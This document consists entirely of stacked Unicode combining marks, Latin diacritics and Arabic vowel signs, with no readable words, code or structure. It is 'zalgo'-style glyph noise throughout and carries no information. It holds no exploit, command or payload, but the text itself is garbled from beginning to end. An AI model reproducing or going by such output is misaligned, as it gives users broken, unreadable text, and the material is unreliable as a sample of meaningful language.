̮͏ًٌٌٍَُِِّ̢͇̤̙̯͑̇͆̇̿͏̷ًًًٌٌٌٍٍٍَََُُُِِِّّّ̨̧̢̛͎͇̩̥͕̫̝̲̳̣̈́̒ͭͫ̉ͦͣ͗́͘̕͝͝͝͞҉ًٌٍٍََُِّّ̡̩̫̮͔̻͍̂́ͫ̐͜͏̸̴̷̷̶̵̴̵ًًًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍَََََََََُُُُُُُُُُِِِِِِِِِّّّّّّّّّ̢̧̡̛͈̣̺̲͖̤̙͇̰͈͍̮͙̳̙̜̭̫̠̥̝̯͉̭͓̞̗̦͓̯͇̝̝̲͓̭̮̻̺̇ͧͭͩ́̈ͧ̉͂͐́ͫ̓͂̔͛͋́́̊̉̌̐́̐̄̓ͬͥ͛̒̀̽ͣ̆̾̎ͤ̈́͘͘͜͟͟͜͡͠͞͝͞͡҉̷ًًٌٌٌٍٍٍََُُِِِّّّ̧̰̞̹͈̩͚͛̄̈ͧ͑͡͡ͅͅ҉ًٌٍَُِ̢̧̜̰ͤ̆҉̷̷̸̸ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍَََََََُُُُُُِِِِِِّّّّّّّ̡̡̢̡̛̞̘̻̭͚̯̲͖̝͎̙̻͈̩̝̣͙̥̱̱̤̺̈́ͩ͊ͫ̇́͒ͮ̍͋̓̃̅͛̿͒ͪ̄͆ͬ͘͘̚͘͘͢͢͟͝͝͏ًُ̞̂̓҉̷̸̶ًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍََََََََََُُُُُُُُُِِِِِِِِِِّّّّّّّّّّ̨̨̨̧̨̡̛̛̫̱̞͖̦̫̘̹̮̞̟̠͙͇̳̳͔̗̞̬̭̝̣̻̯̤̞̯͑̀̈̈́̀͐̀͌ͮ͆͆̆ͫͫ̆ͪ̆̊̿ͣ̾̐̂͌́́̓̐͂ͫ̍́̈́̀̃̅͑ͦ͘̚̕̚͟͢͢͜͟͜͟͢͢͝͞͡͞͞ͅ҉̷̷̴̶̷̵ًًًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُُُِِِِِّّّّّ̢̧̛̪͈͉͉̱͙̠̱͙͎͉͇̯̬̙̟̻͖̥̪ͪͥͮ̀̏̌ͧ́͗͑̃̇̋̈́ͩ̃͂̐͛̂̃̕͘͟͟͜͢͞͡͝҉ٌ̎͏ٍِ̩̃͑҉̵ًًٌٍََُِّّ̨̨̤͇̾̏͗͊͟͝͏ٌُ͙̑҉̶̷̸̴ًًًٌٌٌٍٍٍَََُُُِِِّّّ̨̡̥̺͉̠̤̥ͥ͋̾̑͋ͭ̿̾͊ͦͦ̿̍ͤ̀̈́͛͑͘͟͢͡͞͡͏̷ًًًًٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̨̡̢̗̼̞͎̦̻̣͖͔̟͇̟̘̑̔̔͋ͨͫ́̒́̚͘͟͟͟͜͝͞͞͠͏̵̷̶ًًًٌٌٌٌٍٍٍٍََََُُُِِِِّّّّ̨̡̢̢̛̛̣͔̰̩̠̫̜̭̤̬͔̙͚ͧ̂̍͂͒ͯ̑̂͊͐̑́ͧ̈́ͤ͋̅͢͡͞͡͝҉̴ًًًًًًٌٌٌٌٌٌٍٍٍٍٍَََََُُُُُُِِِِِّّّّّ̧̛̹̺͍͇̣͍̳̬͖̪͕̻̺͎̳̼̩͚̮̠̳ͤ̾̌͑̊̎͂ͨ̐̑̊͊ͧ͗̚͘̕͟͢͢͞͡͏̸ٍِّ͇̭̦ͬͧ̚҉̵̸̶ًًًٌٌٌٍٍٍَََُُُِِِّّّ̧̡̡̨̨̡͖͓̯̥̘͇͉̰̮̅̑ͨ́̎͌̃͂͒̂͞͠͠҉̷ًًٌٍََُِّ̭̪͎̺͉̩̆ͨͦ̓ͣͦ̚͡҉̴̴̷ًًًٌٌٌٌٍٍٍَََُُُُِِِِّّّ̧̡̛͖̯͇̱͖̪͖͙̙̑ͤ͋͗̌̇͗̚͟͟͜͢͞͞͞ͅ҉̷̴ًٌٍٍَُِّ̡̘̜̰͎̰̲̅ͭ̍̂̕҉َّ͔̇͏ًًٌٍَُِّ̡̛͎͉̖͈ͯ̀̊͞ͅ͏̵̷̵ًًٌٌٌٍٍََُُُِِّّ͎̜̹͉͍̙͈͙́̎́ͣ̄ͪ̀̎́͟͞҉ًٌٍٍََُِِّّ̧̘̭̹͉ͫ̀͂̕͢͜͞͏̷̴̷̷ًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍََََََُُُُُُُِِِِِِِّّّّّّ̡̡̨̛̛̛̛̠̖̳͍̺̩̖̥͖̞̘̪̻̙̰͉͔̞̤̳̪͚̤̱̪͈̟̅͒̎͌ͤ͋̂͐̄̍ͨ͆̾͌̎̂ͣͩ̄̄ͭͭ͘͜͟͜͢͠͏̴ًًٌٍََُِّّ̛̘̫̗͈̦̿̓̀ͣ̅͜҉̸̸ًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُُِِِِِِِّّّّّّّ̡̧̡̨̛̛̜̟̘̼̩͍̥͇͉̘̝̻̖̞̲̜̘̙̣̣ͪ̒ͣ̒̅ͪ͒̏́̓͌̒ͨͨ̌̏̂̎͐̌ͭ̆̍̐͋̓̓̚͘͘͜͟͜͟͞͞͡͠͝͠͞͝͞ͅͅ͏ًٌٌٍَُِِّ̱̙͇͕͓̤̉̀͂ͪͣ͢͏̴ًًٌٌٍٍٍََُُِِّّّ̛̲͉̞̘͉̘̙̭́͒̓̿͌͆͊͘͝͝ͅ͏ًًٌٌٍََُُِِّ̢̨̠̦̜̹̖̼̪̥̓́̃͛ͥ́͗̌̀̄͂ͩ͞͏̸̸ًٌٍٍََُِّّ̧͓̥͎̌ͨͩ̆̐̂̓̕ͅ҉̶̵ًًًٌٌٌٍٍٍََُُُِِِّّّ̡̨̢̮͖͇͈̖̞̼̺͛ͯ̑̋̐̅̅̐̽͒̆̕͡͞͞ͅ҉ًًٌٌٍََُُِّ̡̮̥̜̞̭͊́̊̉̐̃̑͐̑͘͟͞҉̷ًٍَُِّ͚̰̖ͩ̀̌͏̷̵̶̵̵̵ًًًٌٌٌٍٍٍَََُُُِِِّّّ̧̡̧̮͕̠̙̳̹̹̙̠͈ͩ̌̎͒̐̋̒̀́͢͡͡͏̶̵ًٌٌٍَُِِّ͇͇̻̹ͯ̈̓̃͜͝͏̸̴̴̷̷̶̴̴̷̸̶ًًًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍَََََََََُُُُُُُُِِِِِِِِّّّّّّّّّ̧̢̧̨̨̢͇͚̟̬͍̦̲̥͈̠̩͕̱͙̘̦͙̳̪̞͍͍͖͉̦̫̱͋ͯ͋ͬ͛͐̀͋͒ͣͯ͌͒̾͊͆ͭ̓͊̐̐ͫͩ͋̈́͘͘͜͟͢͟͠͞͠͡͝͞͠͡͡҉̸̸ًٌٌٍٍََُُِِّّ̡̛̛̲͕̬̣̞̏͑ͤͫ̃͗͊̈́͠͏̶̸̵̶ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍَََََُُُُُُِِِِِِّّّّّ̡̛̛̛̛͖͖̭͕͖̯̥͓̝̰̙̪̥͉̝̪͓͚̠̺͇̘ͭ̓̆̊̿͆͗̒͆ͣͭͯ͐̔͆̃̿̉̕̕͘͟͢͠҉̴̶̴ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̢̧̡͚͚͚͈̟̟̭̼̫͓͕̟̞̰̘̣ͫͭ́̿̏́͐̑͒ͦ̽͆͊̔͆̊̐͘͜͞͝͡͠͡͠͝͝͏ًَُّ̤͇̙͆̌̕͠͏̸̸ًًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِِّّّّّ̢̛̛̩̣͙̟͕̰̼̣̗̯̖̞̻̪͕̺̻ͯͥ̏̑̊͆̿ͩ͐̂ͤͤ̄́̑̚̕͘͟͢͝͝͡͞ͅ҉̴ٌٍَِّ̢̢̠̹̝͍̅̒̈́̚̕҉̸̸̵̴̸̸̶ًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍََََََََََُُُُُُُُُُِِِِِِِِِِّّّّّّّّّّ̧̨̨̧̨̨̨̨̢̛̛̣̟̩̗͍̦̗̻̞͉̹̖̟͇̣͉̤̞̱̝͓̤̥̮̥̰͓̹̯͕̜̙͔̬̖͙̗̮̬̽ͬ̅̅̌̾̑̀͐̀͊ͩ̊̄ͥ̋ͨ̃͛̆̽̎̀̎͋̊̇͗ͯͣͪ̊̇̀ͪͮ̄ͪ̎̋̽̕̕̚͜͜͢͢͢͡͠͡͝͠͠͡͠ͅͅ͏ٌُ͔̿̃͏ًٍَُِّ̡̥̱̏ͨ̇̑̕҉̸̸̷ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُُِِِِِِّّّّّّ̢̨̨̛̫̳͖̟͇̠̣̙̯̯̝̘̭̺͉̜̜̭͓̼͛̓ͨͥ̉̌̀͆͌̑͆͌ͧ̒̅͌̀̍ͧ̊̀͑̓̋̓̓̕͘͘͘͟͜͞͝͠͝͝ͅ͏̷ٌٍَِّ̢̗ͨͤ̚҉̷̴̷̴ًًًًًًٌٌٌٌٌٌٍٍٍٍٍَََََُُُُُُِِِِِِّّّّّ̧̧̨̡̧̡͚̠̝̼͔̯͎͚͈̥̥̲͎̩̗̲͙̘͖̻̖̈́͂ͥͧ̉͆ͥ̍ͣ̐ͬ́̐̐̑̒͊͑ͦͩ̕̕͘͟͝͞͠͡͏̶̶̴̷̴̸̵̷̵̷̶ًًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍََََََََُُُُُُُُِِِِِِِّّّّّّّّ̧̨̢̡̛̯̫͚͚͚̙̺̤̲͇̥̱̠̗̜̺͓͈̰̼̲͐̓̿͒̌̀̅̊̀̔̉̂̃́̐̑ͪ̅ͤ͂͗ͭ̊ͬ͗͒̃̓ͫ̚͘̕͘͢͜͟͞͡͠͠͡͞҉̶̵̶̷̶ًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُُِِِِِِِّّّّّّ̡̢̡̛̬̥̖̩͕̗̣̳͍͎͕̺͍̗̭̟̠̬̯̱̙̦̀̀̆͌́̿͛̃̉͋͌͛̈́̌ͩ̀̈̈́ͮ̄̚͟͝͝͠ͅ͏̵ًًًٌٌٍٍٍَََُُُِِّّّ̢̛̠̱̲͓̫͍̱͈̂ͥ̉̿͑ͤ̎ͫ͗ͮ̚͜͟͠ͅ҉̷̶̴ًًٌٌٌٍٍٍََُُِِِّّ̛̝̙̘͕̲̤͙͓͍͇̄͒̀̇ͦͨͯ̌͗͟͟͝͞͝͞͡͠͏ًَّ̙͈ͯ́ͪ҉̸̷̸̴̷̷ًًًًًٌٌٌٌٌٌٍٍٍٍٍَََََُُُُُُِِِِِِّّّّّ̨̡̨̧̧͉̠̫̫̰̪͔̺̻̯̩̠̼͎̗̩̝̰̱̺̘̞̒ͮͭ̀ͯͮͯͤ̃̽ͫ̆́̀̊̈́͑̂̚̚͜͟͜͟͞͡͏̸̵̶̶̵̶ًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍََََََََُُُُُُُِِِِِِِّّّّّّّّ̡̡̨̛̛̫͍̯͖̘̫͓̮̬͎̣̲͉̲̼̺̮̥̘͙͈͈̙̣͇̻ͣ͛ͮ́͐ͧ̓̑̀ͦ̔́͗̆͋͑͑ͣ̇̏́ͩ͘̕̕͟͢͜͢͠͝͡͡ͅͅ͏̶ًًًٌٌٍٍََُُُِِّّ̜̳̝̣̼̮̲̻̺̼̒ͪͪͬ́̚͘̚̕̚͜͡͏̸̸ًًٌٌٌٍٍٍََُُِِِّّّ̡̡̛͈̺̗͓͈͕̓̉͋͆́́̀̉̒͊͜͞͏̶̴̷ًًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍَََََََُُُُُُِِِِِِّّّّّّ̧̛̠͖̩̩̝̼̫̤͍̫̜͇̫̫̯̹͇͙͉̼̺͚̟̅̈ͧ̇̉̃̋ͥ̋̀̄͛́̈̇ͫ̄͋̉̾̇̕̕͘͘͢͢͠͞͝͝͞͡͠ͅ͏̸̷ًًًٌٌٌٍٍٍَََُُُِِِّّّ̧̡̛̛̪͔̪̺̝̩̮͂ͨ̏͊̃̓͊͘̕͢͟͡͝͡͞͡͏̶ًٌٌٍٍَُُِِّ̢̦͍̭̜͒̂̍̎ͬ̆ͨ̃͞͡҉̷̶̴̶ًًًًٌٌٌٌٍٍٍٍَََََُُُُِِِِّّّّّ̡̡̡̧͍̹͕̫͙̱͈̖̱͉̣͚̄̌̏̀́ͦͪ̾̄̀̅͋̓̐ͮ̇͂͛ͫ̽͢͢͢͜͟͠͝͞͞ͅͅ҉̷̷ًًٌٍَُُِّ̭͙͈͈̮̟͋ͮͯ̕͜͞͏ٌٍِّ̦̞̏͟͏̴̷ًًٌٌٍٍَََُُِِّّ̡̧̯̖̹̮͚̳̣͛̀ͣ̓͗̀͋͏̵̷̶̴̶ًًًًًٌٌٌٌٌٍٍٍٍََََُُُُُِِِِّّّّ̡̨͖̘͇̗͕̟̩̫̺̭͔̙̬̼̦͓̰̌͋͊͛̅̔ͤͮ̀̐̑̆̍̎͐͛̉̔ͦ̓̒̕̕̚͢͠͝͡͏ًٍَِّ̢̜̻͔̤͊̂̃҉̴̵̶ًًٌٌٌٍٍََُُُِِّّ̯̮͕̖͉̫̠̭̿ͫ̂͘̕͡͠҉ًٌٍَُِِّ͓̯̙̖͕̀̅́ͩ̑͛͏̴ًٍَّ̮̩̄͛҉̶ًًًٌٌٌٍٍٍَََُُُُِِِّّّ̧̨̨̧̛̛̛̼̤̙̟̭͕̣̙ͧ͒̎̒̃̉ͬ̄͗͗̊̉̃͘͘͜͏ًٌٍَُِّ̢̠͈͔͚͕̗̐̀̽͌̉͆͟҉̶̴̸ًًًٌٌٌٍٍٍَََُُِِِّّّ̨̧̞̲͍̯͚̲̮͎̥̟̔̐ͫ̉̓͂̆́ͫ̕͘͢͢͡͏̸ًًٌٌٌٍٍٍََُُُِِِّّ̛̻̼̻̠̬͍̺̘͕̦̞ͤͯ͂̋ͯ̌̀̀̍̇̿͘̚͘͘̕͟͜͟͟͝͠͝҉̶̵ًًٌٍََُُِّّ̡̛͇̞̗̳͍̄ͤͩͤͮ͊̕͢͟͝ͅ҉̷̶ًًًًٌٌٌٌٌٍٍٍٍََََُُُُِِِِِّّّّ̡̢̨̨̙̠̞͙͎̖͈̲̥̪ͩͫͩͧ̀͗̐̆̀͋ͦ́̌̕͘͡͡͡ͅͅ҉̸̶̴ًًًًٌٌٌٌٍٍٍٍٍَََََُُُُِِِِّّّّّ̨̯̙͈̱̬̭̼͓̮̣̖̘̯̖̺̙͓̒ͩ̈̊̈͋͗ͨͭͧͭͦ̀̽̑̐̓͌͗̕͜͟͞͡͞҉ًًٌٌٍٍَُُِِّ̢͓̯̞̝̙͍̜̒͗ͨ̀ͨͨ̋͂ͨ͘̕ͅ͏ًًٌٌٍََُُِّّ̧̜̟̘̬̇͌̚͘̚͟͠͡͡҉ٍِ͎̌͏ًٌٍَُِّ̨̜̹̪̟̯͔̏҉ًٌَُّ̧͕̟̹́̋͜͏̸̶̸̷̸ًًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُِِِِِِِّّّّّّّ̢̡̡̨̢̢̨̛͕̥̦̭̗̬̥̠̳̬̭̠͔̳̮̠̦͓͔͎̟̬͉̜̝̀̆̌͌ͦ̆͂͑ͭ͐̎͑̄̾ͨͥ̽́̀͐̔̃͐̄̈̆̀ͯ̿̂̚̕͟͠͡͝͞͠͡͝͏̶̴ًٌٌٍَُِّ̘̙̩̗̔ͧͣ̽ͫ̅̕͝҉̴̵ًًًًٌٌٌٌٍٍٍٍٍَََََُُُُِِِِِّّّّّ̢̧̡̛̳̘̺͉̤̙̮̙̣͙̲̫̺̬̺͉̘͆̈́ͫ͆̅̊̀ͧ̇͋͗ͭ͐͂ͩͧ̽ͮ͘̕͜͝͝͝ͅ͏̴̴̴̴ًًًًًًٌٌٌٌٌٌٍٍٍٍٍَََََُُُُُُِِِِِّّّّّ̢̡̢̛̝̮̪̱̰̦̲̜̟̻̝̳̱̱̟̬͈͙̹͇̗̂ͨ́͗̃ͭ̀ͭ̒̍̎̾̾͂ͥ͒ͤ͆̄̕͜͜͠͝͞͠͏̵̸̸̷ًًًٌٌٌٍٍٍٍَََُُُِِِِّّّّ͔̯̯̻͖͔̼̫̹̣͔̈͆ͬ͋͌̓́̆́ͣ́ͧ͘͘̚͟͢͝͠͏ًًٌٌٍٍََُُِِّّ̢̺̫̥͖ͣ́́̐ͧ̿̉͊ͪ̕͜͢͞͠͏̶̶ًٌَُ͖̱͉̇́̊̔҉̶ًٌٍَُِِّ̧̛̠͉̖̞͛̉̊̂̓҉̷̴̵̴̴̷̵̶ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُِِِِِِّّّّّّّ̧̢̛̺̪̻̫͙͎̩͇̺̗͇̹͓̞̦̟͓͍̤͙͚̪̳̠ͧ̓ͫ̊͐ͭͨͥͪ͋͌͆͌͑́͊ͭͬͮͥ̀̈͊̚̕͜͟͟͞͝͡͠͞͠ͅͅ҉̸ًٌٍَُِّ̘̽̂͢͟͝͏̷ًٌٍَُِّ̨͓ͥͩͫ̊͡͝͏ًًٌٍَُُِّ̧̛̫͎̬̥̂ͮ̅ͭ͟͞ͅ҉̸̶̸ًًًًٌٌٌٌٍٍٍٍََََُُُِِِِّّّّ̨̨̳̺̦̝̝̟͙̯̲͚̖͔͉͔̒͌̾̐́̈́̀ͨ̿͆̀̂͊̓ͨ̏ͪ̑͋͘͘͢͜͠͡͞͞ͅ҉̶̵̶̸̵̸̸̶̷̸ًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍَََََََََََُُُُُُُُُُُُِِِِِِِِِِِِّّّّّّّّّّّ̧̧̧̧̡̨̢͕̖̺̜̥̼̲̳̜̖̖̩̙͇͚͙͚̥͕̘̱͓̘͓̹̖͉̳̲̝̩̘̠͉̠̟͒́ͫ̓͗̉̊̌́̂͒͂̌̓̎̓ͤͨ͋ͣ́͊͌͐͊̊ͭ̌̀̂̓̒ͧ͂ͥͭ̐͗́̌̕̕̕̕͘̕͢͟͜͟͢͜͢͢͠͞͝͠͞͠͝͞͝͠͞͝͝͏̶̷̶̸ًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍََََََََََََُُُُُُُُُُُِِِِِِِِِِِّّّّّّّّّّّّ̢̡̡̧̨̧̛͇̗̬̺͎̙͇̖̬̲̲͈̖͓͈̞̭̼̘̱̭͓͕̲̼͈͔͖̤̬̩̗̗̥͕̺͉̯̲̦͉͓̣̝́ͪ̑̀ͧͪ̀̉̅̑̈͊ͯͮ̋̄̀̑ͯ̀ͦ͑̂̎ͫ̆͂̄͛̿̅̋ͭ͛͑͛̇̇ͬ̆̆͘̕̚̕͘̕͘͘͢͢͜͢͢͡͠͡͠͠͡͠͠͝͠ͅͅͅ͏̶ٌٍُِ̺͖̱ͤͭ҉̴َّ͇̑͏̶̸ًًًٌٌٌٍٍٍََُُُِِِّّّ̨̧̛͉͇̙̟̝̼̰̺̺̝̝̾ͬͭ̔́ͮ̅̄͘͘̚͜͡҉̴̷̸ًًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍَََََََََُُُُُُُُُِِِِِِِِِّّّّّّّّّ̡̡̨̡̡̡̛̛̛̛͓͉̮͕̣̤̳̻̳̱̘͎͚̖̲̜̭͕̙̤̫̗̭̤̼̯̠̽̃̃͌͋̓͐͂̀͊ͮ̌̎͑̈͑̀̌̈ͯ̆ͦ̓̋ͤ̅̕̕̕̕͟͟͢͠͡͝͞͝͝ͅͅ͏̶ًَُ̎͏̵ًٌٍَُِّ̨̺̼̣ͤ̐ͪ͘͢͏ًٌٌٍَُِّ̢̡̟̳͚ͦ͐ͯͩ͜͡҉̷̵̴̴̸̵ًًًًٌٌٌٍٍٍٍََََُُُِِِِّّّّ̡̢̢̣̜̗͈̦̼͔̩͔̼͎͉͂ͣͯ̇̄̋ͭ́̋͋̂͆̽͘̕͢҉ٌُِ̳̝̀҉̷̷̸̷̸ًًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُِِِِِِّّّّّّّ̧̧̧̢̛̛̛͈͚̻͇̲̺͉̪̖̫̝̙͎̲̺̪̤̣̮̥͌̀̈̋͐̅ͭ́͂̃̎̀͐̀̌͐ͬ͊ͥ̆ͤ̽ͩ̈ͤ̓ͩ̃ͪͦ̋ͤ̈̀͘̕͘͘͜͢͢͢͠͞͏̵̶̸ًًًٌٌٌٍٍٍَََُُُِِِّّّ̡̢̢̡̢̧̰͈͇͈̯̳̥͈͚̣ͣ̍̀̍̅͂́ͦ̅͆̀̇͛̏͜҉ٌٍَِّ͉͉͈̱̽͠͏ًٌٍَُِّ̢̭̬͈̙̣ͯ͐̅͟͠͡͏̷̵ًًًٌٌٌٍٍٍََُُُِِِّّّ̡̣̱̮̗͔͈̥̙̻̀̏̋͊̓̂̍ͨ̈͢͡͝͏̶̴ًًًًٌٌٌٌٍٍٍََََُُُُِِِّّّ̢̱͎͕̘̰̠̘͕̱̠͗̊͐ͤͥͧͪ̈́̉̄ͭ͋̎̕͡҉̴̷̶̴̴̶̶̸̶̶̶̷̸̷̶̶̵̶ًًًًًًًًًًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍَََََََََََََََََََََُُُُُُُُُُُُُُُُُُُُُِِِِِِِِِِِِِِِِِِِِِِّّّّّّّّّّّّّّّّّّّّّ̨̧̨̨̧̢̡̨̧̛̛̛͖̰̲̜̫͕̻̞͎̫̠͈̳̼͓͖̩͉̯̲̺͇̺͓͉͕̻͍̫̯̥̪͕̯͙̻̠̩͇͔̗̲̯̘̭̙͚̲͉̫͇̣̳̬̱̞͍͓̦̤̲̠͎̞̱͔̳̲̯̺̃ͫ̉̓ͥ̽́̈ͧ̾ͪͯͮ͗̍̔̀ͦͭ̐̏̀̇̂̃́͑̑̈͋̉ͫͥ̀̑ͣ̇́͂̀ͯͤ̅͌ͧ͋͛ͤ͂͂̒̂͑ͩ͌͂̎͐̄̓́ͮ͛̎̋̀̈́̏ͦ̇̃̓ͪͣ͆̋̍̃ͥ̈̈́̕̚̕͘̕̕͘̕͢͜͢͢͜͜͜͢͟͜͟͠͡͝͡͡͡͞͞͠͝͝͝͡͞͏ًٍَّ͓̣̆͟͏̷̶̵̶̶̵̷̷̵̵ًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُُِِِِِِِِّّّّّّّ̧̢̡̛̭̤͈͇̫͍̦̖̳̲͔̯̞̦̮̯͔̥͕̰̱̹͈̞̤̘̘̼͚͓ͪ̒̇̋ͮ̏͌ͩͩͫ͑͂͋̊ͨͫͬ̄ͪ̐͂̄ͥ̈͘͢͢͢͡͡͝͡͝͝͞͞͝͞͝͏̷ًٌٍٍََُِّّ͚͚̤̝͎͐̀̍͐̆̿͡҉̶ًٌُِ̰͖̾̉҉̶ًٍَّ̪̰̀ͮ̒͏̶̴̴̷ًٌٌٍٍَُُِِّ̛͔̹̾̿̑͞͡͠͏̶ًٌَُِّ͇̠̪͗̀́҉ٍَّ̖ͪ͝͏̵̵̶̷̵̶ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍَََََُُُُُُِِِِِِّّّّّّ̧̨̨̡̛̛͈̬̦̳̻̯͍̲̦̜͈̯̫͓̬̳͎̟̓́̇͐ͫ̍̌̏ͫ̓̎̿̈́ͬ̈́ͮͬ̊̄͊̉́̊̅̌̓͟͜͡͝҉َ҉̸̴̶ًًًًٌٌٌٌٍٍٍٍَََُُُُِِِِّّّ̧̢̰͙͙͍̻̟̫̯̭̤̼̫ͭ̉͗̃͛͆̀̌ͬ̒͂̑̅͂͂̀͌̃͘̚͢͝͏̶̵̷ًًًًًٌٌٌٌٌٍٍٍٍَََََُُُُُِِِِّّّّّ̨̧̟̖̙͇̘͎̹͕͈̠͓̺̫̘̿͛͂̎̀ͦͮ́͂͒̀ͯ̓̈ͬ́͑̓̽ͨ̃ͦ̕͜͟͟͜͡͠͠͞҉̴̸̶ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̡̨̡̧̛̯̲̱̘̟͖̳̗̟̗̖͒̊͒͂͂ͪ̄̌̎̋͗̄́̍ͯ̕͜͡͠͝͠҉ًٌٍَُِِّ͍̳̗̥͗̽͑̅͘͠͏̵̶̷ًًٌٌٍٍََُُِّّ̧̢̯̩̰͍͇̞͕͖̫͗̎͐ͨͨ̆̄͘͝҉̴̷̴ًًٌٌٍٍٍََُُِِِّّ̡̹̗͓̱̗ͫ̓ͨ̑ͤ̿̆̐͢͢͠͞͝҉̸̶ًًٌٌٍٍََُُِِّّّ͈̩̩̯̝̭̬̳͚̺͔ͯ̾͋͂̿́̽̃ͬ̈̇͟͟҉ًًٌٌٍٍَََُُِِّّ̧̡̛͙̞̟̳̹̳̖̖̔̊́ͭ͋͒̊̓ͤ̀̚͘͜͢͝͏̴̴ًًٌٍَُُِّ̞̹̰͇͕̱̓ͮ̊͊̆ͦ͢͝͡͏̶̷̶̶̵̶̷ًًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِِّّّّّ̢̨̡̧̩̞̮͉̦͖̻͇͉͚̦̹̼̹͓͙̯̽͑̋ͥͯ́ͧͯͣ͒̍̍ͤ̊ͪ̆̕̕͘͟͜͠͡͡͏ًٌٌٍَُِِّ̥̼̪̩̖̩̌̀̂̑ͫ͒͢͜͡͏̸̵̵ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُِِِِِِّّّّّّّ̡̛̛̛̻̗̮͚͚̱̘̳̝͈̙̳͙͇̰̮͙̲͍̝̥̐̂́̈́́ͭ͐͌ͦ̈́̊́ͭ̏́͌͂̑ͣ̏̔̅̔̅ͪͪ̈̕̚͟͟͟͝͠͏ًُ̝͖͛͏ًًٌٌٍٍََُِِّّ̢̧̢̡̫̣̜̠͙̦͆̎͆̕͝҉̷ًٌٍَُِّ̡̢͖̙̳̿͗ͤͭͧ͏̸ًًٌٌٌٍٍََُُُِِّّ̨̧̫̳̟͉̠̭͙̗͕̑͆̈́̊́́͑́́ͮ̚͢͡͠҉̸ًًًًًٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُِِِِِِّّّّّّ̧̨̛̛̣͓̝͓̩̭̱̝̰̗̗̥̰̱̖̥̝ͧ̽͌ͤ͂̂ͧ̿̆͋ͨͬ̂̅̎͐̀̿̀ͯͣ͘̚͜͢͜͟͜͠͠͝͞͡͏ًُ̜̒̕҉ٌ̮͏̸ًًًٌٌٌٍٍٍَََُُُِِِِّّّ̡̧̬̥̞͖͕͈̖̮͎͖͖ͭ͌̀̾̐̽ͨͣ̓͡͞͝҉ًٌٍٍَُِّ̡͎̯ͨͨ̿͆́̅̍͞͏̴ًٌٍَُِّ̞͙̻̠ͧ͂͐͏̸̸ًًٌٌٍٍََُُِِّّّ̨̥̙̜͚͇̭͖͕͚̀ͣ͌ͤ̿̓̉̔͜͟͢͝ͅ͏̷̴̸̶ًًًٌٌٌٍٍٍَََُُُِِِّّّ̢̛̱̰̜̯̱̖̩̙̩͖̟̮̤̏͐̂̉͗͂͑̋͘͜͡͞͏̴̷̵ًًًًٌٌٌٌٍٍٍٍَََََُُُُِِِِّّّّ̧̨̛̲̞͓̮̹̙̖͖͉̣̫̙̲̣̞̖ͭ̏͐̎ͫ́͒̎͂ͨ́́̑́̒̕͘̕͢͠͞͝ͅ҉̸̸̸̵ًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُِِِِِِِّّّّّّّ̢̛̛͎̬̝̻̰͙̹̪̩̯̦̗̘̳̱͔͖͕̖̬̲̩̹̜̙̝̖͋̏̌͗͆ͦ̓́̍̎ͯ͌́̍̌ͫ̓̈́̒ͥ͋̈́̍̄̎̎̎̀̓̕͢͟͜͜͟͞͞͞͞͠ͅ҉̴̴̷̶ًًًًٌٌٌٌٍٍٍٍَََُُُُِِِِّّّ̨̢̧̭͈̤̰͕̳͙͕̺͓̞͙͓̀ͪ̽́̂̃͂͂̇́̈ͬͬ̉́̔̈́͘͜͢͞͡ͅͅ͏ّ̅҉̷̶ًًٌٍََُِّ̟̣̝̫̀́̂͡͠͝͠ͅͅ͏̷̴̴ًًًًٌٌٌٌٌٍٍٍٍٍََََُُُُُِِِِِّّّّ̨̢̨̛̞͈͓͕̗̮͚͎̩̹̘̫͔̣͍̮͇͓̤͙͎̒̑̐̅̎ͤ́̂́̈̈ͯ̀ͣ͑̇̈̽͜͢͠͏ًٌٍََُِّّ̢̢̢̤͇̱͕̍͂̈́̐ͮ͑ͬͦ͝͏̴̷̷̶̴̷̸ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍَََََُُُُُُِِِِِِّّّّّ̢̡̨̨̛̱͚̝̝͖̳͚͚͙̝̪̖͇̭͙͈͍͆̓̍̇̿ͮͦͣ̎̀́̀͑̒̎̀̎͒̽̒̕̕̕͘͘͜͜͠͞ͅ͏̵ًٌٍَُِّ̢͓̖ͩ͒͡͏̶ًٌٍَُِّّ̢̭̤̫̙̉̅͗͢͡